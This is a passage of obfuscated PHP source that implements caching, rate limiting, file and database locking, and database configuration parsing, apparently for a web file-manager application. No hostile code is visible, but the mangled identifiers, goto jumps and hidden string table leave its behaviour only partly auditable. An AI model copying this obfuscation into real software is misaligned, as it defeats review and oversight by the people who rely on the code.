<?php
 goto e½ß‰Û„äŸ; A’¡ÑÅê…ô: class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $’¨²Í©ç =& $_SERVER[åÄ¼Ùßš]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $øú¼„ ¶ = $GLOBALS[$’¨²Í©ç[6]][$’¨²Í©ç[426]]; $”Àª•¯Œ = $øú¼„ ¶[$øú¼„ ¶[$’¨²Í©ç[928]]]; $©ÑıšÓ­ = $øú¼„ ¶[$’¨²Í©ç[929]]; switch ($øú¼„ ¶[$’¨²Í©ç[928]]) { case $’¨²Í©ç[21]: self::$handle = Model($’¨²Í©ç[930]); break; case $’¨²Í©ç[931]: self::$handle = new CacheRedis($”Àª•¯Œ, $©ÑıšÓ­); break; case $’¨²Í©ç[932]: self::$handle = new CacheMemcached($”Àª•¯Œ, $©ÑıšÓ­); break; case $’¨²Í©ç[233]: self::$handle = new CacheFile($”Àª•¯Œ, $©ÑıšÓ­); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($íçÛÈê) { if (is_array($íçÛÈê) || is_object($íçÛÈê)) { $íçÛÈê = json_encode($íçÛÈê); } $íçÛÈê = rawurlencode($íçÛÈê); return md5(KOD_SITE_ID . $_SERVER[åÄ¼Ùßš][11] . $íçÛÈê); } public static function get($ŞÙ÷’šù, $ğçĞ÷ş = false) { $ğÖÛóæî = self::key($ŞÙ÷’šù); $ÛØÓ°‰ƒ = self::init(); if ($ğçĞ÷ş) { return unserialize($ÛØÓ°‰ƒ->get($ğÖÛóæî)); } if (!isset(self::$memoryCache[$ğÖÛóæî])) { $¿ƒ™­Ş½ = $ÛØÓ°‰ƒ->get($ğÖÛóæî); self::$memoryCache[$ğÖÛóæî] = unserialize($¿ƒ™­Ş½); } return self::$memoryCache[$ğÖÛóæî]; } public static function set($´œ„Ší½, $ËŸÆÀë, $­á‡¶ê = false) { $ÛşÇääÛ =& $_SERVER[åÄ¼Ùßš]; $Ÿ…ÕË–Ÿ = self::key($´œ„Ší½); if (isset(self::$memoryCache[$Ÿ…ÕË–Ÿ]) && self::$memoryCache[$Ÿ…ÕË–Ÿ] === $ËŸÆÀë) { return !0; } if ($­á‡¶ê === 0) { self::$memoryCache[$Ÿ…ÕË–Ÿ] = $ËŸÆÀë; return !0; } $¢š€òá½ = self::init(); $ô®¶åÒœ = serialize($ËŸÆÀë); CacheLock::lock($´œ„Ší½ . $ÛşÇääÛ[933]); $ĞÓÆœ§Í = $¢š€òá½->set($Ÿ…ÕË–Ÿ, $ô®¶åÒœ, $­á‡¶ê); self::$memoryCache[$Ÿ…ÕË–Ÿ] = $ËŸÆÀë; CacheLock::unlock($´œ„Ší½ . $ÛşÇääÛ[933]); return $ĞÓÆœ§Í; } public static function getCall($Ã—½¢øø, $§ƒùÕ¹ù, $ÀÓ’ıëè, $Ğ±Õàø = array()) { $™ø‹ÛÊ  =& $_SERVER[åÄ¼Ùßš]; $ôİ³÷áË = self::get($Ã—½¢øø); if ($ôİ³÷áË || $ôİ³÷áË === $™ø‹ÛÊ [12]) { return $ôİ³÷áË; } $ôİ³÷áË = call_user_func_array($ÀÓ’ıëè, $Ğ±Õàø); $ôİ³÷áË = $ôİ³÷áË ? $ôİ³÷áË : $™ø‹ÛÊ [12]; self::set($Ã—½¢øø, $ôİ³÷áË, $§ƒùÕ¹ù); return $ôİ³÷áË; } public static function limitCall($Ã±À´³, $’©÷•÷Â = 15, $–´ íÄ = 30, $•·¬•Á = true) { $Å ®¢´ô =& $_SERVER[åÄ¼Ùßš]; static $˜‰æç½ = array(); if ($•·¬•Á) { $Ã±À´³ = $Ã±À´³ . $Å ®¢´ô[934] . KodUser::id() . $Å ®¢´ô[935] . get_client_ip(); } if (isset($˜‰æç½[$Ã±À´³]) && is_array($˜‰æç½[$Ã±À´³])) { return $˜‰æç½[$Ã±À´³][$Å ®¢´ô[335]] <= $–´ íÄ; } $öåŠòóñ = self::get($Ã±À´³); if (!is_array($öåŠòóñ) || time() - $öåŠòóñ[$Å ®¢´ô[207]] > $’©÷•÷Â) { $öåŠòóñ = array($Å ®¢´ô[207] => time(), $Å ®¢´ô[335] => 0); } $öåŠòóñ[$Å ®¢´ô[335]]++; self::set($Ã±À´³, $öåŠòóñ, $’©÷•÷Â); $˜‰æç½[$Ã±À´³] = $öåŠòóñ; return $öåŠòóñ[$Å ®¢´ô[335]] <= $–´ íÄ; } public static function limitRuntime($½—˜™¤¤, $éÓêæàê) { $ôà°ÙÂÅ = $_SERVER[åÄ¼Ùßš][936] . $½—˜™¤¤; if (isset(self::$runTimeCache[$ôà°ÙÂÅ]) || !$éÓêæàê) { return !0; } $ˆ‘¤¹Ñá = intval(self::get($ôà°ÙÂÅ)); $ˆ‘¤¹Ñá = !$ˆ‘¤¹Ñá || $ˆ‘¤¹Ñá <= 0 ? 1 : $ˆ‘¤¹Ñá + 1; if ($ˆ‘¤¹Ñá > $éÓêæàê) { return !1; } self::$runTimeCache[$ôà°ÙÂÅ] = !0; self::set($ôà°ÙÂÅ, $ˆ‘¤¹Ñá, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $µçÅ®¢Â => $æ¦³’öÄ) { $ö¨ªüÉ§ = intval(self::get($µçÅ®¢Â)); $ö¨ªüÉ§ = !$ö¨ªüÉ§ || $ö¨ªüÉ§ <= 1 ? 0 : $ö¨ªüÉ§ - 1; self::set($µçÅ®¢Â, $ö¨ªüÉ§, 3600); } self::$runTimeCache = array(); } public static function remove($©ÃÀåîÅ) { $¡İ”âó = self::key($©ÃÀåîÅ); unset(self::$memoryCache[$¡İ”âó]); self::clearTimeout(); CacheLock::lock($©ÃÀåîÅ); $Ô»²Öó = self::init()->remove($¡İ”âó); CacheLock::unlock($©ÃÀåîÅ); return $Ô»²Öó; } public static function removeMemory($¾ŸïÛÍñ) { $Ç°ƒô˜ = self::key($¾ŸïÛÍñ); unset(self::$memoryCache[$Ç°ƒô˜]); } public static function clearMemory($ŞÖø¢Ï = false) { if ($ŞÖø¢Ï) { $ŞÖø¢Ï = self::key($ŞÖø¢Ï); unset(self::$memoryCache[$ŞÖø¢Ï]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[åÄ¼Ùßš][937])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[åÄ¼Ùßš][938])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ß÷ç°Ê, $µ‚Ğıü­) { $áø—õÒÎ =& $_SERVER[åÄ¼Ùßš]; $this->cachePath = $ß÷ç°Ê[$áø—õÒÎ[87]]; $this->prefix = $áø—õÒÎ[939]; $this->cacheTime = $µ‚Ğıü­; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($­¢¹›ˆ²) { $œ¦ÈŠê» =& $_SERVER[åÄ¼Ùßš]; $­¢¹›ˆ² = str_replace(array($œ¦ÈŠê»[940], $œ¦ÈŠê»[100], $œ¦ÈŠê»[76]), $œ¦ÈŠê»[941], $­¢¹›ˆ²); return $this->cachePath . $œ¦ÈŠê»[942] . $­¢¹›ˆ² . $œ¦ÈŠê»[943]; } public function set($¦ÇÇÇ“Ë, $éãÍÎÉı, $„Ÿ¤·ß« = false) { $„Ÿ¤·ß« = $„Ÿ¤·ß« ? $„Ÿ¤·ß« : $this->cacheTime; $—ÁÓƒÇ» = $this->getFile($¦ÇÇÇ“Ë); if (file_put_contents($—ÁÓƒÇ», $this->prefix . $éãÍÎÉı, LOCK_EX)) { @touch($—ÁÓƒÇ», intval(time() + $„Ÿ¤·ß«)); clearstatcache(); return !0; } @unlink($—ÁÓƒÇ»); return !1; } public function get($ÏŠ¢óáË) { $Øšéèğä = $this->getFile($ÏŠ¢óáË); if (file_exists($Øšéèğä) && filemtime($Øšéèğä) < time()) { @unlink($Øšéèğä); return !1; } $ñĞ™°àÜ = @file_get_contents($Øšéèğä); return substr($ñĞ™°àÜ, strlen($this->prefix)); } public function remove($İ¡ğ‰Í) { $¦«ûˆ¤” = $this->getFile($İ¡ğ‰Í); return @unlink($¦«ûˆ¤”); } public function deleteAll() { $ûîæåå¹ =& $_SERVER[åÄ¼Ùßš]; $âïıéÆ = scandir($this->cachePath); foreach ($âïıéÆ as $Ã¤ÉíøŸ) { $³¿åôçş = $this->cachePath . $Ã¤ÉíøŸ; if (strpos($³¿åôçş, $ûîæåå¹[943]) && strpos($³¿åôçş, $ûîæåå¹[944])) { @unlink($³¿åôçş); } } } public function clearTimeout() { $ò¯£„à¨ =& $_SERVER[åÄ¼Ùßš]; $ëáíëš = scandir($this->cachePath); foreach ($ëáíëš as $„øÊ²û ) { $Ùçøß¿¯ = $this->cachePath . $„øÊ²û ; if (strpos($Ùçøß¿¯, $ò¯£„à¨[943]) && strpos($Ùçøß¿¯, $ò¯£„à¨[944]) && filemtime($Ùçøß¿¯) < time()) { @unlink($Ùçøß¿¯); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $”÷İº¤Ü =& $_SERVER[åÄ¼Ùßš]; if (self::$handle) { return self::$handle; } $´„ê±ëó = $GLOBALS[$”÷İº¤Ü[6]][$”÷İº¤Ü[426]]; self::$timeout = $´„ê±ëó[$”÷İº¤Ü[945]] ? $´„ê±ëó[$”÷İº¤Ü[945]] : 10; $œƒÈ§ÌÚ = _get($GLOBALS[$”÷İº¤Ü[6]], $”÷İº¤Ü[946]); $ø±ßñøÈ = $´„ê±ëó[$”÷İº¤Ü[928]] ? $´„ê±ëó[$”÷İº¤Ü[928]] : $”÷İº¤Ü[233]; if ($ø±ßñøÈ == $”÷İº¤Ü[21] && $œƒÈ§ÌÚ == $”÷İº¤Ü[13]) { $ø±ßñøÈ = $”÷İº¤Ü[233]; } switch ($ø±ßñøÈ) { case $”÷İº¤Ü[931]: self::$handle = new CacheLockRedis(); break; case $”÷İº¤Ü[932]: self::$handle = new CacheLockMemcached(); break; case $”÷İº¤Ü[21]: self::$handle = new CacheLockDatabase(); break; case $”÷İº¤Ü[233]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($”÷İº¤Ü[947], $”÷İº¤Ü[948]); } return self::$handle; } private static function key($¤ùı £•) { return $_SERVER[åÄ¼Ùßš][949] . Cache::key($¤ùı £•); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($éŸ ØÌÌ = '') { self::$errorMsg = $éŸ ØÌÌ; } public static function lockGlobal($Õ™¾Âûë, $ï€Ôƒ°û) { return self::lock($Õ™¾Âûë, $ï€Ôƒ°û, !0); } public static function lock($ìòØĞ’Ò, $Ù¦Šùè = false, $şÍ˜ú¹ú = false) { $ÉÈ¨Òï =& $_SERVER[åÄ¼Ùßš]; $¼—¢³Ô  = self::init(); $õŸ±öÂÂ = self::key($ìòØĞ’Ò); $Ù¦Šùè = $Ù¦Šùè ? $Ù¦Šùè : self::$timeout; $½ÚòÑä° = timeFloat(); if (_get($GLOBALS, $ÉÈ¨Òï[950], !1)) { if (!$¼—¢³Ô ->lock($õŸ±öÂÂ, 0.2)) { die; } return !0; } $ß´¥û˜‚ = $¼—¢³Ô ->lock($õŸ±öÂÂ, $Ù¦Šùè); $Õ£Ëä•ë = timeFloat(); if (!$ß´¥û˜‚) { $İŠæíèÚ = "\154\x6f\143\x6b\x20\x65\162\x72\x6f\x72\x3b\x6b\145\171\75{$ìòØĞ’Ò}\73\x74\x69\x6d\x65\75{$Ù¦Šùè}\x3b" . self::$errorMsg . $ÉÈ¨Òï[74] . get_caller_msg(); $‡ ®òÒà = LNG($ÉÈ¨Òï[951]) . "\50{$Ù¦Šùè}\x73\51\x2e" . LNG($ÉÈ¨Òï[952]); $‡ ®òÒà .= $ÉÈ¨Òï[953]; if (is_string(self::$errorMsg) && self::$errorMsg) { $‡ ®òÒà = $‡ ®òÒà . $ÉÈ¨Òï[954] . self::$errorMsg; } write_log($ÉÈ¨Òï[955] . sprintf($ÉÈ¨Òï[956], timeFloat() - $½ÚòÑä°) . $ÉÈ¨Òï[957] . $İŠæíèÚ . $ÉÈ¨Òï[958] . json_encode(error_get_last()), $ÉÈ¨Òï[948]); show_json($‡ ®òÒà, !1); } if (!$şÍ˜ú¹ú) { self::$lockItem[$õŸ±öÂÂ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $¥çêĞÁ = number_format(timeFloat() - $Õ£Ëä•ë, 3); write_log($ÉÈ¨Òï[959] . $ìòØĞ’Ò . $ÉÈ¨Òï[960] . $¥çêĞÁ, $ÉÈ¨Òï[948]); } return $ß´¥û˜‚; } public static function lockGet($¸Ø¼•ú) { $¤ïÕ ¿ = self::key($¸Ø¼•ú); if (self::$lockItem[$¤ïÕ ¿]) { return self::$lockItem[$¤ïÕ ¿]; } return self::init()->lockGet($¤ïÕ ¿); } public static function unlock($Ùåš¶´) { $È¶àÖÃÀ =& $_SERVER[åÄ¼Ùßš]; $ãÛ¨ÀÒ = self::key($Ùåš¶´); self::$lockItem[$ãÛ¨ÀÒ] = null; self::init()->unlock($ãÛ¨ÀÒ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($È¶àÖÃÀ[961] . $Ùåš¶´, $È¶àÖÃÀ[948]); } return; } public static function unlockRuntime() { $áó´ß»ı =& $_SERVER[åÄ¼Ùßš]; $üÉ€“ê£ = self::init(); $Å…Ò÷¿ã = !1; foreach (self::$lockItem as $À¡âû” => $€²Òò‡ó) { if (!$€²Òò‡ó) { continue; } $üÉ€“ê£->unlock($À¡âû”); if (!$Å…Ò÷¿ã) { $Å…Ò÷¿ã = !0; write_log($áó´ß»ı[962] . $À¡âû” . $áó´ß»ı[74] . get_caller_msg(), $áó´ß»ı[948]); continue; } write_log($áó´ß»ı[962] . $À¡âû”, $áó´ß»ı[948]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ÑŒÓÌÉ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($áó´ß»ı[963] . $ÑŒÓÌÉ . $áó´ß»ı[964] . ACTION, $áó´ß»ı[948]); } } public static function fileLock($÷¶ù§øÆ) { $î·‘°“Â =& $_SERVER[åÄ¼Ùßš]; if (!$GLOBALS[$î·‘°“Â[965]]) { $GLOBALS[$î·‘°“Â[965]] = array(); } $GLOBALS[$î·‘°“Â[965]][$÷¶ù§øÆ] = !1; $·±ìöèƒ = fopen(DATA_PATH . $÷¶ù§øÆ . $î·‘°“Â[966], $î·‘°“Â[967]); if (!$·±ìöèƒ) { return !1; } $GLOBALS[$î·‘°“Â[965]][$÷¶ù§øÆ] = $·±ìöèƒ; if (flock($·±ìöèƒ, LOCK_EX)) { return !0; } self::unlock($÷¶ù§øÆ); show_json($î·‘°“Â[968], !1); return !1; } public static function fileUnlock($ô÷ÛâÂŞ) { $âÓ¸òé” =& $_SERVER[åÄ¼Ùßš]; $—¿¿–­å = $GLOBALS[$âÓ¸òé”[965]][$ô÷ÛâÂŞ]; if (!$—¿¿–­å) { return; } $GLOBALS[$âÓ¸òé”[965]][$ô÷ÛâÂŞ] = !1; flock($—¿¿–­å, LOCK_UN); fclose($—¿¿–­å); } public static function fileUnlockAll() { $ÒïÀÃÕß =& $_SERVER[åÄ¼Ùßš]; if (!isset($GLOBALS[$ÒïÀÃÕß[965]]) || !$GLOBALS[$ÒïÀÃÕß[965]]) { return; } foreach ($GLOBALS[$ÒïÀÃÕß[965]] as $úÓ±ôãÓ => $†Ó“üà›) { if (!$†Ó“üà›) { continue; } $GLOBALS[$ÒïÀÃÕß[965]][$úÓ±ôãÓ] = !1; flock($†Ó“üà›, LOCK_UN); fclose($†Ó“üà›); } $GLOBALS[$ÒïÀÃÕß[965]] = array(); } } goto cÏÈÖæš³¡; eíÇ¸ƒ…¬: class DbSqlite3 extends DbSqlite3Base { public function query($îŠ¤éŠÄ) { $èÊÅ¨›ø =& $_SERVER[åÄ¼Ùßš]; if (!CacheLock::fileLock($èÊÅ¨›ø[13])) { return !1; } $üĞÉ©ş = parent::query($îŠ¤éŠÄ); CacheLock::fileUnLock($èÊÅ¨›ø[13]); return $üĞÉ©ş; } public function execute($®Ê‡åµê) { $õâóÙÒ¹ =& $_SERVER[åÄ¼Ùßš]; if (!CacheLock::fileLock($õâóÙÒ¹[13])) { return !1; } $ŸœÊ­¢Ø = parent::execute($®Ê‡åµê); CacheLock::fileUnLock($õâóÙÒ¹[13]); return $ŸœÊ­¢Ø; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\x65\x71" => "\74\76", "\147\164" => "\x3e", "\145\147\164" => "\x3e\x3d", "\154\164" => "\x3c", "\x65\x6c\164" => "\74\x3d", "\x6e\157\164\x6c\x69\153\145" => "\116\x4f\x54\x20\114\x49\x4b\x45", "\154\x69\x6b\145" => "\x4c\111\113\x45", "\151\x6e" => "\111\x4e", "\156\157\164\151\156" => "\x4e\x4f\x54\40\111\116", "\x6e\x6f\x74\40\151\x6e" => "\116\117\x54\x20\x49\x4e", "\x62\x65\x74\x77\145\145\x6e" => "\x42\105\124\127\105\x45\x4e", "\x6e\157\x74\142\x65\164\x77\145\x65\x6e" => "\x4e\x4f\x54\x20\x42\105\x54\x57\x45\x45\116", "\x6e\157\164\x20\x62\145\164\x77\145\x65\x6e" => "\x4e\117\x54\40\x42\x45\124\127\105\105\116"); protected $selectSql = "\x53\105\114\x45\x43\x54\x25\104\111\x53\x54\x49\x4e\103\124\45\x20\45\106\x49\x45\x4c\x44\x25\40\106\x52\117\115\40\45\x54\x41\x42\x4c\x45\45\x25\112\x4f\x49\x4e\x25\x25\x57\x48\105\x52\x45\x25\45\107\122\117\x55\120\45\45\x48\x41\126\111\x4e\x47\x25\45\x4f\122\x44\x45\x52\45\45\x4c\111\x4d\111\124\45\x20\x25\x55\116\x49\117\x4e\x25\45\x43\117\x4d\x4d\105\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $¡‹¬ÒØ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[åÄ¼Ùßš][1068], $¡‹¬ÒØ); } public function factory($ÌŸåú²ı = '') { $©ï–‘§ü =& $_SERVER[åÄ¼Ùßš]; $ÌŸåú²ı = $this->parseConfig($ÌŸåú²ı); if (empty($ÌŸåú²ı[$©ï–‘§ü[1069]])) { think_exception(think_lang($©ï–‘§ü[1070])); } $this->dbType = ucwords(strtolower($ÌŸåú²ı[$©ï–‘§ü[1069]])); $îÚóË¥ı = $©ï–‘§ü[1071] . $this->dbType; if (class_exists($îÚóË¥ı)) { $Ëï³Àœ¶ = new $îÚóË¥ı($ÌŸåú²ı); if ($©ï–‘§ü[1072] != strtolower($ÌŸåú²ı[$©ï–‘§ü[1069]])) { $Ëï³Àœ¶->dbType = strtoupper($this->dbType); } else { $Ëï³Àœ¶->dbType = $this->_getDsnType($ÌŸåú²ı[$©ï–‘§ü[1024]]); } } else { think_exception(think_lang($©ï–‘§ü[1073]) . $©ï–‘§ü[1074] . $îÚóË¥ı); } return $Ëï³Àœ¶; } public function __call($×Î‚ãÇ–, $´õîÑô¿) { if (method_exists($this, $×Î‚ãÇ–)) { return call_user_func_array(array($this, $×Î‚ãÇ–), $´õîÑô¿); } } protected function _getDsnType($ÚÄÊ€ñê) { $¶­şÄ¼ = explode($_SERVER[åÄ¼Ùßš][4], $ÚÄÊ€ñê); $øïË­­ = strtoupper(trim($¶­şÄ¼[0])); return $øïË­­; } private function parseConfig($ù¢öø½¡ = '') { $î’÷ªÆ› =& $_SERVER[åÄ¼Ùßš]; if (!empty($ù¢öø½¡) && is_string($ù¢öø½¡)) { $ù¢öø½¡ = $this->parseDSN($ù¢öø½¡); } elseif (is_array($ù¢öø½¡)) { $ù¢öø½¡ = array_change_key_case($ù¢öø½¡); $ù¢öø½¡ = array($î’÷ªÆ›[1069] => $ù¢öø½¡[$î’÷ªÆ›[1075]], $î’÷ªÆ›[993] => $ù¢öø½¡[$î’÷ªÆ›[1076]], $î’÷ªÆ›[994] => $ù¢öø½¡[$î’÷ªÆ›[1077]], $î’÷ªÆ›[991] => $ù¢öø½¡[$î’÷ªÆ›[1078]], $î’÷ªÆ›[992] => $ù¢öø½¡[$î’÷ªÆ›[1079]], $î’÷ªÆ›[21] => $ù¢öø½¡[$î’÷ªÆ›[1080]], $î’÷ªÆ›[1024] => $ù¢öø½¡[$î’÷ªÆ›[1081]], $î’÷ªÆ›[17] => isset($ù¢öø½¡[$î’÷ªÆ›[1082]]) ? $ù¢öø½¡[$î’÷ªÆ›[1082]] : array()); } elseif (empty($ù¢öø½¡)) { if (think_config($î’÷ªÆ›[1083]) && $î’÷ªÆ›[1072] != strtolower(think_config($î’÷ªÆ›[1084]))) { $ù¢öø½¡ = $this->parseDSN(think_config($î’÷ªÆ›[1083])); } else { $ù¢öø½¡ = array($î’÷ªÆ›[1069] => think_config($î’÷ªÆ›[1084]), $î’÷ªÆ›[993] => think_config($î’÷ªÆ›[1085]), $î’÷ªÆ›[994] => think_config($î’÷ªÆ›[1086]), $î’÷ªÆ›[991] => think_config($î’÷ªÆ›[1087]), $î’÷ªÆ›[992] => think_config($î’÷ªÆ›[1088]), $î’÷ªÆ›[21] => think_config($î’÷ªÆ›[326]), $î’÷ªÆ›[1024] => think_config($î’÷ªÆ›[1083]), $î’÷ªÆ›[17] => think_config($î’÷ªÆ›[1089])); } } return $ù¢öø½¡; } protected function initConnect($¼áİÁ­à = true) { if (1 == think_config($_SERVER[åÄ¼Ùßš][22])) { $this->_linkID = $this->multiConnect($¼áİÁ­à); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ºÃşªã­ => $“êğ˜Ğ„) { $this->_linkID = $“êğ˜Ğ„; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($úï×¾š = false) { $Ğ¡£“åÈ =& $_SERVER[åÄ¼Ùßš]; static $„ıä¢ŠŞ = array(); static $øŠ–‰Ú = -1; if (empty($„ıä¢ŠŞ)) { foreach ($this->config as $Ô°ß‡Æ† => $ä¿Ş×šá) { $„ıä¢ŠŞ[$Ô°ß‡Æ†] = explode($Ğ¡£“åÈ[50], $ä¿Ş×šá); } } if (think_config($Ğ¡£“åÈ[1090])) { if ($úï×¾š || think_config($Ğ¡£“åÈ[483]) === !0) { $­¿æèê = floor(mt_rand(0, think_config($Ğ¡£“åÈ[1091]) - 1)); $øŠ–‰Ú = $­¿æèê; } else { if (is_numeric(think_config($Ğ¡£“åÈ[1092]))) { $­¿æèê = think_config($Ğ¡£“åÈ[1092]); } else { $­¿æèê = floor(mt_rand(think_config($Ğ¡£“åÈ[1091]), count($„ıä¢ŠŞ[$Ğ¡£“åÈ[991]]) - 1)); } } } else { $­¿æèê = floor(mt_rand(0, count($„ıä¢ŠŞ[$Ğ¡£“åÈ[991]]) - 1)); $øŠ–‰Ú = $­¿æèê; } $­¿æèê = $øŠ–‰Ú !== -1 ? $øŠ–‰Ú : $­¿æèê; $Û”°“”Ë = array($Ğ¡£“åÈ[993] => isset($„ıä¢ŠŞ[$Ğ¡£“åÈ[993]][$­¿æèê]) ? $„ıä¢ŠŞ[$Ğ¡£“åÈ[993]][$­¿æèê] : $„ıä¢ŠŞ[$Ğ¡£“åÈ[993]][0], $Ğ¡£“åÈ[994] => isset($„ıä¢ŠŞ[$Ğ¡£“åÈ[994]][$­¿æèê]) ? $„ıä¢ŠŞ[$Ğ¡£“åÈ[994]][$­¿æèê] : $„ıä¢ŠŞ[$Ğ¡£“åÈ[994]][0], $Ğ¡£“åÈ[991] => isset($„ıä¢ŠŞ[$Ğ¡£“åÈ[991]][$­¿æèê]) ? $„ıä¢ŠŞ[$Ğ¡£“åÈ[991]][$­¿æèê] : $„ıä¢ŠŞ[$Ğ¡£“åÈ[991]][0], $Ğ¡£“åÈ[992] => isset($„ıä¢ŠŞ[$Ğ¡£“åÈ[992]][$­¿æèê]) ? $„ıä¢ŠŞ[$Ğ¡£“åÈ[992]][$­¿æèê] : $„ıä¢ŠŞ[$Ğ¡£“åÈ[992]][0], $Ğ¡£“åÈ[21] => isset($„ıä¢ŠŞ[$Ğ¡£“åÈ[21]][$­¿æèê]) ? $„ıä¢ŠŞ[$Ğ¡£“åÈ[21]][$­¿æèê] : $„ıä¢ŠŞ[$Ğ¡£“åÈ[21]][0], $Ğ¡£“åÈ[1024] => isset($„ıä¢ŠŞ[$Ğ¡£“åÈ[1024]][$­¿æèê]) ? $„ıä¢ŠŞ[$Ğ¡£“åÈ[1024]][$­¿æèê] : $„ıä¢ŠŞ[$Ğ¡£“åÈ[1024]][0], $Ğ¡£“åÈ[17] => isset($„ıä¢ŠŞ[$Ğ¡£“åÈ[17]][$­¿æèê]) ? $„ıä¢ŠŞ[$Ğ¡£“åÈ[17]][$­¿æèê] : $„ıä¢ŠŞ[$Ğ¡£“åÈ[17]][0]); return $this->connect($Û”°“”Ë, $­¿æèê); } public function parseDSN($ºàÄŠ‚„) { $Àà°ªƒµ =& $_SERVER[åÄ¼Ùßš]; if (empty($ºàÄŠ‚„)) { return !1; } $ÌÛØ•÷Ã = parse_url($ºàÄŠ‚„); if ($ÌÛØ•÷Ã[$Àà°ªƒµ[208]]) { $¯æùŸ‡¸ = array($Àà°ªƒµ[1069] => $ÌÛØ•÷Ã[$Àà°ªƒµ[208]], $Àà°ªƒµ[993] => isset($ÌÛØ•÷Ã[$Àà°ªƒµ[678]]) ? $ÌÛØ•÷Ã[$Àà°ªƒµ[678]] : $Àà°ªƒµ[12], $Àà°ªƒµ[994] => isset($ÌÛØ•÷Ã[$Àà°ªƒµ[1093]]) ? $ÌÛØ•÷Ã[$Àà°ªƒµ[1093]] : $Àà°ªƒµ[12], $Àà°ªƒµ[991] => isset($ÌÛØ•÷Ã[$Àà°ªƒµ[209]]) ? $ÌÛØ•÷Ã[$Àà°ªƒµ[209]] : $Àà°ªƒµ[12], $Àà°ªƒµ[992] => isset($ÌÛØ•÷Ã[$Àà°ªƒµ[210]]) ? $ÌÛØ•÷Ã[$Àà°ªƒµ[210]] : $Àà°ªƒµ[12], $Àà°ªƒµ[21] => isset($ÌÛØ•÷Ã[$Àà°ªƒµ[87]]) ? substr($ÌÛØ•÷Ã[$Àà°ªƒµ[87]], 1) : $Àà°ªƒµ[12]); } else { preg_match($Àà°ªƒµ[1094], trim($ºàÄŠ‚„), $‡×§™ã‰); $¯æùŸ‡¸ = array($Àà°ªƒµ[1069] => $‡×§™ã‰[1], $Àà°ªƒµ[993] => $‡×§™ã‰[2], $Àà°ªƒµ[994] => $‡×§™ã‰[3], $Àà°ªƒµ[991] => $‡×§™ã‰[4], $Àà°ªƒµ[992] => $‡×§™ã‰[5], $Àà°ªƒµ[21] => $‡×§™ã‰[6]); } $¯æùŸ‡¸[$Àà°ªƒµ[1024]] = $Àà°ªƒµ[12]; return $¯æùŸ‡¸; } protected function debug() { $ÄÓáÕ¡ =& $_SERVER[åÄ¼Ùßš]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ÄÓáÕ¡[1095]; if (think_config($ÄÓáÕ¡[1096])) { think_status($ÄÓáÕ¡[1097]); think_trace($this->queryStr . $ÄÓáÕ¡[1098] . think_status($ÄÓáÕ¡[24], $ÄÓáÕ¡[1097], 6) . $ÄÓáÕ¡[1099], $ÄÓáÕ¡[12], $ÄÓáÕ¡[1100]); } } protected function parseLock($úŠ—à¸“ = false) { $Â¨îèİÚ =& $_SERVER[åÄ¼Ùßš]; if (!$úŠ—à¸“) { return $Â¨îèİÚ[12]; } if ($Â¨îèİÚ[1026] == $this->dbType) { return $Â¨îèİÚ[1101]; } return $Â¨îèİÚ[1102]; } protected function parseSet($µÔ…) { $±ÏÜƒ¼ˆ =& $_SERVER[åÄ¼Ùßš]; foreach ($µÔ… as $¼ ª¶·Ë => $æ÷êÓÀ) { if (is_array($æ÷êÓÀ) && $±ÏÜƒ¼ˆ[374] == $æ÷êÓÀ[0]) { $‘Ø Î»½[] = $this->parseKey($¼ ª¶·Ë) . $±ÏÜƒ¼ˆ[465] . $æ÷êÓÀ[1]; } elseif (is_scalar($æ÷êÓÀ) || is_null($æ÷êÓÀ)) { $‘Ø Î»½[] = $this->parseKey($¼ ª¶·Ë) . $±ÏÜƒ¼ˆ[465] . $this->parseValue($æ÷êÓÀ); } } return $±ÏÜƒ¼ˆ[1103] . implode($±ÏÜƒ¼ˆ[50], $‘Ø Î»½); } protected function bindParam($ö¡øûñ…, $ªÉñÍ) { $this->bind[$_SERVER[åÄ¼Ùßš][4] . $ö¡øûñ…] = $ªÉñÍ; } protected function parseBind($Ã¿÷ã’œ) { $Ã¿÷ã’œ = array_merge($this->bind, $Ã¿÷ã’œ); $this->bind = array(); return $Ã¿÷ã’œ; } function parseKey(&$ÀİÔÛÆÚ, $Ì˜ÃùçŞ = true) { if ($Ì˜ÃùçŞ) { $ÀİÔÛÆÚ = $this->parseKeyCheck($ÀİÔÛÆÚ); } return 